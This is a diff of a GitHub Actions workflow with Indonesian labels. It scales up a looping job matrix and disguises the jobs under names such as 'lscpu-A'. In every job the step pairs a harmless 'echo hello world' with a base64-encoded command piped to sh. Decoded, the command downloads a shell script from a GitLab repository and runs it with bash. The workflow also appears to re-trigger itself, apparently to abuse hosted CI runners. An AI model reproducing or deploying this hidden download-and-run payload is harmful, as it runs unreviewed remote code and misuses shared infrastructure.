@@ -6,7 +6,7 @@ on:
       loop_count:
         description: 'Siklus tersisa'
         required: true
-        default: '180'
+        default: '1800'
 
 permissions:
   actions: write
@@ -16,16 +16,17 @@ jobs:
     name: ${{ matrix.name }}
     strategy:
       fail-fast: false
-      max-parallel: 3
+      max-parallel: 4
       matrix:
         include:
-          - name: lscpu-1
-          - name: lscpu-2
-          - name: lscpu-3
+          - name: lscpu-A
+          - name: lscpu-B
+          - name: lscpu-C
+          - name: lscpu-D
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 6
     steps:
-      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 240
+      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 300
 
   trigger-hello:
     needs: run-lscpu
